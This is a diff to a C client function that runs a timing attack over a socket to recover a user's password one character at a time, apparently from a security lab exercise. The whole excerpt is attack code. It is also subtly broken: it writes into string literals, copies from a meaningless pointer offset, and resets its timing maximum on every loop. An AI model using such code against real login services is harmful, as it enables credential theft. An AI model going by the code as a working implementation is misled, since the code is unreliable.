@@ -22,7 +22,8 @@
 
 char* discoverPassword(int clientSocket, char* username) {
 
-    char* password_buffer = "";
+    char* rightPassword = "";
+    char* password_buffer = "!";
     char server_buffer[1024];
 
     char maxTimeChar;
@@ -40,6 +41,8 @@ char* discoverPassword(int clientSocket, char* username) {
 
     // Perform the timing attack to discover the password
     while(1) {
+        strcpy(password_buffer, (rightPassword+currChar));
+
         timeBefore = time(NULL);
 
         send(clientSocket, password_buffer, strlen(password_buffer), 0);
@@ -51,8 +54,8 @@ char* discoverPassword(int clientSocket, char* username) {
 
         timeAfter = time(NULL);
 
-        if(strcmp(server_buffer, "Authenticated") == 0) {
-            break;
+        if(strcmp(server_buffer, "Authenticated") == 0) {   // The right password found
+            break;  
         }
         
         if((timeAfter-timeBefore) > maxTime) {
@@ -60,10 +63,19 @@ char* discoverPassword(int clientSocket, char* username) {
             maxTimeChar = currChar;
         }
 
+        // Move to the next char
+        currChar++;
+        if(currChar > 126) {
+            currChar = 33;
+            password_buffer[strlen(password_buffer)] = maxTimeChar;
+            strcpy(rightPassword, password_buffer);
+        }
+
+        maxTime = 0;
         bzero(server_buffer, sizeof(server_buffer)); 
     }
     
-    return password_buffer;
+    return rightPassword;
 }
 
 void chatWithServer(int clientSocket) {
